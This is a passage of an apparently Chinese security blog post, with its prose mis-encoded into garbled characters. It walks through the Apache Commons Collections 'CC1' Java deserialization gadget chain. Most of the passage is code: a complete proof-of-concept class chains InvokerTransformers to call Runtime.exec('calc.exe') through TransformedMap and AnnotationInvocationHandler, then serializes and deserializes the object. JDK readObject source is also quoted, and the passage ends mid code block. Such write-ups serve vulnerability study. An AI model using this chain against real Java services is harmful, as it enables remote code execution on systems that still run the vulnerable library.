&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.annotation.Retention&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;xxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»…æœ‰demoçš„ä»£ç ä¸è¶³ä»¥æž„é€ å®Œå…¨å¯ç”¨çš„pocï¼Œå®žé™…çš„ååºåˆ—åŒ–ä¸­ï¼Œä¸åŒäºŽæ‰‹å·¥æ‰§è¡ŒouterMap.put()ï¼Œæˆ‘ä»¬ç¦»ä¸å¼€ä¸€ä¸ªåˆé€‚çš„&lt;code>readObject&lt;/code>è§¦å‘&lt;code>outerMap.put&lt;/code>-&amp;gt;&lt;code>transform&lt;/code>&lt;/p>
&lt;p>è¿™é‡Œç”¨åˆ°çš„æ˜¯&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>ï¼Œçœ‹ä¸€ä¸‹å®ƒçš„&lt;code>readObject&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">defaultReadObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AnnotationType&lt;/span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">AnnotationType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalArgumentException&lt;/span> &lt;span style="color:#111">var9&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Non-annotation type in annotation serial stream&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">var3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">memberTypes&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Iterator&lt;/span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">memberValues&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">entrySet&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">iterator&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hasNext&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Entry&lt;/span> &lt;span style="color:#111">var5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Entry&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">var6&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">var7&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var7&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var8&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!(&lt;/span>&lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">ExceptionProxy&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setValue&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AnnotationTypeMismatchExceptionProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var8&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;[&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;]&amp;#34;&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">setMember&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">Method&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">members&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»£ç æ¯”è¾ƒå¥½çœ‹æ‡‚ï¼Œå…ˆæ˜¯å¾—åˆ°å‰é¢ä¼ å…¥çš„Mapï¼ˆæˆ‘ä»¬ä¼ å…¥ç»è¿‡TransformedMapä¿®é¥°çš„å¯¹è±¡ï¼‰ï¼Œä¹‹åŽä¾æ¬¡éåŽ†ï¼Œåˆ°äº†&lt;code>setValue&lt;/code>æ—¶ä¼šè§¦å‘transformçš„å›žè°ƒ&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä»¬æž„é€ POCæ—¶éœ€è¦åˆ›å»º&lt;code>AnnotationInvocationHandler&lt;/code>å¯¹è±¡ï¼Œå¹¶æŠŠå‰é¢çš„&lt;code>HashMap&lt;/code>ä¼ è¿›æ¥ä½œä¸ºMapå‚æ•°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
